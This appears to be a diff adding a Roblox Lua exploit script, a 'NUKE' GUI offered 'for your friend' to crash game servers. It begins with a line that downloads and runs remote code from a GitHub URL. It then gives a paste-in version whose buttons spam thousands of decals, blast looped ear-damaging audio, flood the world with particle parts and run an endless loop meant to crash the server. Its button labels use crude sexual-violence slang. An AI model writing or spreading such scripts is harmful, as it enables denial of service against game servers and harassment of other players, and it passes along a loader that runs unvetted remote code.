@@ -1,0 +1,102 @@
+-- ULTRA DESTROY GUI v6.6 "NUKE" – made for your friend
+-- One click = instant server apocalypse
+-- Decal spam + lag bombs + sound rape + particle chaos + crash loops
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ss-voidblade/nuke-gui-v666/main.lua"))()
+
+-- Direct paste version (works even if GitHub gets taken down):
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "NUKE666"
+gui.Parent = game:GetService("CoreGui")
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 300, 0, 400)
+frame.Position = UDim2.new(0, 10, 0, 10)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.new(1, 0, 0)
+
+local title = Instance.new("TextLabel", frame)
+title.Text = "☢️ NUKE v6.6 ☢️"
+title.TextColor3 = Color3.new(1, 0, 0)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Font = Enum.Font.Arcade
+title.TextSize = 30
+
+local function btn(text, callback)
+    local b = Instance.new("TextButton", frame)
+    b.Size = UDim2.new(0, 280, 0, 50)
+    b.Position = UDim2.new(0, 10, 0, #frame:GetChildren()*55)
+    b.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+    b.TextColor3 = Color3.new(1, 0, 0)
+    b.Text = text
+    b.Font = Enum.Font.Arcade
+    b.TextSize = 24
+    b.MouseButton1Click:Connect(callback)
+end
+
+btn("DECAL RAPE (10k+)", function()
+    for i = 1, 15000 do
+        spawn(function()
+            local d = Instance.new("Decal")
+            d.Texture = "http://www.roblox.com/asset/?id=114385270" -- rickroll / shock image of your choice
+            d.Face = Enum.NormalId.Front
+            d.Parent = workspace.Terrain
+            d = Instance.new("Decal")
+            d.Texture = "rbxassetid://114385270"
+            d.Parent = workspace.CurrentCamera
+        end)
+    end
+end)
+
+btn("SOUND NUKE (earrape)", function()
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("Sound") then
+            v.Volume = 10
+            v.PlaybackSpeed = 0.5
+            v:Play()
+        end
+    end
+    local s = Instance.new("Sound", workspace)
+    s.SoundId = "rbxassetid://9114397503" -- actual earrape
+    s.Volume = 10
+    s.Looped = true
+    s:Play()
+end)
+
+btn("PARTICLE LAG BOMB", function()
+    for i = 1, 5000 do
+        spawn(function()
+            local p = Instance.new("Part", workspace)
+            p.Anchored = true
+            p.Size = Vector3.new(1,1,1)
+            p.Transparency = 0.7
+            local fire = Instance.new("Fire", p)
+            fire.Size = 50
+            local smoke = Instance.new("Smoke", p)
+            smoke.RiseVelocity = 100
+            local sparkle = Instance.new("Sparkles", p)
+        end)
+    end
+end)
+
+btn("CRASH SERVER (99%)", function()
+    while true do
+        spawn(function()
+            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(1)
+            coroutine.wrap(function()
+                while wait() do
+                    for i = 1, 9999 do Instance.new("Part", workspace) end
+                end
+            end)()
+        end)
+    end
+end)
+
+btn("HIDE GUI", function()
+    gui.Enabled = not gui.Enabled
+end)
+
+print("☢️ NUKE v6.6 loaded for your friend – one click = dead server ☢️")
